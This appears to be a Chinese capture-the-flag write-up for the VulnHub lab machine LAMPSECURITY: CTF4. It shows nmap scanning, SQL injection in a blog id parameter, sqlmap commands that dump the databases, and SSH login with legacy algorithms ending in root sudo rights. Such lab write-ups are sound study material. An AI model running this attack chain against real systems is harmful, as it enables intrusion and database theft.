# LAMPSECURITY: CTF4

> 靶机文档：[LAMPSECURITY: CTF4](https://www.vulnhub.com/entry/lampsecurity-ctf4,83/)
>
> 下载地址：[**Download (Mirror)**](https://download.vulnhub.com/lampsecurity/ctf4.zip)
>

### nmap扫描

详细扫描

```bash
sudo nmap -sT -sV -O -p22,25,80,631 10.9.75.12 -oA ./sT 
```



![image-20240120201755011](imgs/image-20240120201755011.png)

### SQL注入

访问80端口

![image-20240120202322533](imgs/image-20240120202322533.png) 

当访问`Blog`的时候

![image-20240120202357553](imgs/image-20240120202357553.png)

地址 变成了`http://10.9.75.12/index.html?page=blog&title=Blog&id=2`

http://10.9.75.12/index.html?page=blog&title=Blog&id=2'

![image-20240120202431461](imgs/image-20240120202431461.png)

发现SQL报错

### sqlmap枚举

使用`sqlmap`跑

```bash
python3 sqlmap.py -u "http://10.9.75.12/index.html?page=blog&title=Blog&id=2"
```

![image-20240120202806961](imgs/image-20240120202806961.png)

存在注入点

枚举所有数据库

```bash
python3 sqlmap.py -u "http://10.9.75.12/index.html?page=blog&title=Blog&id=2" --dbs --batch
```

![image-20240120203019829](imgs/image-20240120203019829.png)

枚举当前数据库

```bash
python3 sqlmap.py -u "http://10.9.75.12/index.html?page=blog&title=Blog&id=2" --current-db --batch
```

![image-20240120203054886](imgs/image-20240120203054886.png)

```bash
python3 sqlmap.py -u "http://10.9.75.12/index.html?page=blog&title=Blog&id=2" --dbs --dump --batch
```

![image-20240120203356282](imgs/image-20240120203356282.png)

前期扫描扫出来`22`端口

尝试SSH连接

```bash
ssh dstevens@10.9.75.12
```

![image-20240120205506247](imgs/image-20240120205506247.png)

```bash
ssh  -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  dstevens@10.9.75.12
```

![image-20240120205900569](imgs/image-20240120205900569.png)

```bash
ssh  -oHostKeyAlgorithms=ssh-rsa,ssh-dss  -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  dstevens@10.9.75.12
```

![image-20240120205924107](imgs/image-20240120205924107.png)

查看能以`root`运行的权限

![image-20240120210021562](imgs/image-20240120210021562.png)

发现有所有的权限

### 提权

![image-20240120210057960](imgs/image-20240120210057960.png)